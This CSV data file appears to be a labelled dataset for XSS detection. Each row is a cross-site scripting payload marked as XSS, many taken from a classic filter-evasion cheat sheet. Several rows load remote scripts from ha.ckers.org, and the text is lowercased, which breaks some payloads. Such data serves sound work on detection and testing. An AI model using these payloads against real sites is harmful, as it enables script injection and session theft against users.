payload,xss
"<style>.xss{background-image:url(""javascript:alert('xss')"");}</style><a class=xss></a>",1
"<style type=""text/css"">body{background:url(""javascript:alert('xss')"")}</style>",1
"<base href=""javascript:alert('xss');//"">",1
<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('xss')></object>,1
"a=""get"";b=""url("""";c=""javascript:"";d=""alert('xss');"")"";eval(a+b+c+d);",1
"<xml id=xss><x><c><![cdata[<img id=xss src=""javas]]><![cdata[cript:alert('xss');"">]]></c></x><xml><span dataid=xss src=#i datafld=cdataformatas=html></span>",1
"<xml id=""xss""><i><b><img id=xss src=""javas<!-- -->cript:alert('xss')""></b></i></xml><span dataid=xss src=""#xss"" datafld=""b"" dataformatas=""html""></span>",1
"<xml id=xss src=""xsstest.xml"" id=i></xml><span dataid=xss src=#i datafld=c dataformatas=html></span>",1
"<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""xss<script defer>alert(""xss"")</script>""></body></html>",1
"<? echo('<scr)';echo('ipt>alert(""xss"")</script>'); ?>",1
"<meta http-equiv=""set-cookie"" content=""userid=<script>alert('xss')</script>"">",1
<script id=xss src=http://127.0.0.1></script>,1
"//--></script>"">'><script>alert(string.fromcharcode(88,83,83))</script>",1
"<img id=xss src=javascript:alert(string.fromcharcode(88,83,83))>",1
"<img id=xss src=""&14;javascript:alert('xss');"">",1
"<script <b>=alert('xss');""></script>",1
"<iframe id=xss src=""javascript:alert('xss'); <",1
<script>a=/xss/nalert('xss');</script>,1
"<style>li {list-style-image: url(""javascript:alert('xss');</style><ul><li>xss",1
"<div style=""background-image: url(javascript:alert('xss'));"">",1
"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""></head>+adw-script+ad4-alert('xss');+adw-/script+ad4-",1
"<a href=""javascript#alert('xss');"">",1
"<div onmouseover=""alert('xss');"">,",1
"<input type=""image"" dynid=xss src=""javascript:alert('xss');"">",1
"&<script>alert('xss');</script>"">",1
<img id=xss src=&{alert('xss');};>,1
"<a id=xss href=""about:<script>alert('xss');</script>"">",1
"<div id=xss style=""binding: url(javascript:alert('xss'));"">",1
"<object classid=clsid:..."" codebase=""javascript:alert('xss');"">",1
<style><!--</style><script>alert('xss');//--></script>,1
![cdata[<!--]]<script>alert('xss');//--></script>,1
<!-- -- --><script>alert('xss');</script><!-- -- -->,1
"<img id=xss src=""blah""onmouseover=""alert('xss');"">",1
"<img id=xss src=""blah>""onmouseover=""alert('xss');"">",1
"<xml id=""x""><a><b><script>alert('xss');</script>;<b></a></xml>",1
"<div datafld=""b"" dataformatas=""html"" dataid=xss src=""#xss""></div>",1
[a][a]script>alert('xss');[a][a]/script>,1
"<xml id=i><x><c><![cdata[<img id=xss src=""javas]]<![cdata[cript:alert('xss');"">]]</c><x></xml>",1
"<form id=""test"" /><button form=""test"" formaction=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))"">x",1
"<input id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>",1
"<select id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>",1
"<textarea id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>",1
"<keygen id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>",1
"<input id=xss onblur=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus><input autofocus>",1
"<video id=xss poster=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))//",1
"<body id=xss onscroll=eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>",1
"<video><source onerror=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))"">",1
"<video onerror=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))""><source>",1
<iframe id=xss / /onload=alert(/xss/)></iframe>,1
"<iframe id=xss / ""onload=alert(/xss/)></iframe>",1
<iframe id=xss///////onload=alert(/xss/)></iframe>,1
"<iframe id=xss ""onload=alert(/xss/)></iframe>",1
<iframe id=xss <?php echo chr(11)?> onload=alert(/xss/)></iframe>,1
<iframe id=xss <?php echo chr(12)?> onload=alert(/xss/)></iframe>,1
""" onfocus=alert(xss) ""> <""",1
""" onblur=alert(xss) ""> <""",1
""" onmouseover=alert(xss) "">",1
""" onclick=alert(xss) "">",1
"<style>li {list-style-image: url(""javascript:alert('xss')"");}</style><ul><li>xss",1
"</textarea>'""><script>alert(xss)</script>",1
"'""""><script language=""javascript""> alert('x s s');</script>",1
</script></script><<<<script><>>>><<<script>alert(xss)</script>,1
<html><noalert><noscript>(xss)</noscript><script>(xss)</script>,1
'></select><script>alert(xss)</script>,1
}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>,1
"<script>document.write(""xss"");</script>",1
"a=""get"";b=""url"";c=""javascript:"";d=""alert('xss');"";eval(a+b+c+d);",1
"='><script>alert(""xss"")</script>",1
"<body background=javascript:'""><script>alert(xss)</script>></body>",1
"data:text/html;charset=utf-7;base64,ij48l3rpdgxlpjxzy3jpchq+ywxlcnqomtmznyk8l3njcmlwdd4=",1
<script>alert('xss');</script>,1
<script id=xss src=http://ha.ckers.org/xss.js></script>,1
"<img id=xss src=`javascript:alert(""rsnake says, 'xss'"")`>",1
id=xss src= <img 6;avascript:alert('xss')>,1
"<script/xss id=xss src=""http://ha.ckers.org/xss.js""></script>",1
<script id=xss src=http://ha.ckers.org/xss.js?<b>,1
"<img id=xss src=""javascript:alert('xss')""",1
<script>a=/xss/,1
"<img dynid=xss src=""javascript:alert('xss')"">",1
"<img lowid=xss src=""javascript:alert('xss')"">",1
"<br size=""&{alert('xss')}"">",1
"<layer id=xss src=""http://ha.ckers.org/scriptlet.html""></layer>",1
"<link rel=""stylesheet"" href=""http://ha.ckers.org/xss.css"">",1
<style>@import'http://ha.ckers.org/xss.css';</style>,1
"<meta http-equiv=""link"" content=""<http://ha.ckers.org/xss.css>; rel=stylesheet"">",1
"<style>body{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</style>",1
"<img id=xss src=""mocha:[code]"">",1
"<img id=xss src=""livescript:[code]"">",1
"<meta http-equiv=""link"" content=""<javascript:alert('xss')>; rel=stylesheet"">",1
"<meta http-equiv=""refresh"" content=""0; url=http://;url=javascript:alert('xss');"">",1
"<div style=""background-image: url(javascript:alert('xss'))"">",1
"<div style=""width: expression(alert('xss'));"">",1
"<img style=""xss:expr/*xss*/ession(alert('xss'))"">",1
"<xss style=""xss:expression(alert('xss'))"">",1
"exp/*<xss style='no\\xss:noxss(""*//*"");",1
"<object type=""text/x-scriptlet"" data=""http://ha.ckers.org/scriptlet.html""></object>",1
"geturl(""javascript:alert('xss')"")",1
"a=""get"";",1
"<!--<value><![cdata[<xml id=i><x><c><![cdata[<img id=xss src=""javas<![cdata[cript:alert('xss');"">",1
"<xml id=xss src=""http://ha.ckers.org/xsstest.xml"" id=i></xml>",1
"<script id=xss src=""http://ha.ckers.org/xss.jpg""></script>",1
"<!--#exec cmd=""/bin/echo '<script src'""--><!--#exec cmd=""/bin/echo '=http://ha.ckers.org/xss.js></script>'""-->",1
<? echo('<scr)';,1
"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-alert('xss');+adw-/script+ad4-",1
"<script a="">"" id=xss src=""http://ha.ckers.org/xss.js""></script>",1
"<script a="">"" '' id=xss src=""http://ha.ckers.org/xss.js""></script>",1
"<script ""a='>'"" id=xss src=""http://ha.ckers.org/xss.js""></script>",1
"<script a=`>` id=xss src=""http://ha.ckers.org/xss.js""></script>",1
"<script>document.write(""<scri"");</script>pt id=xss src=""http://ha.ckers.org/xss.js""></script>",1
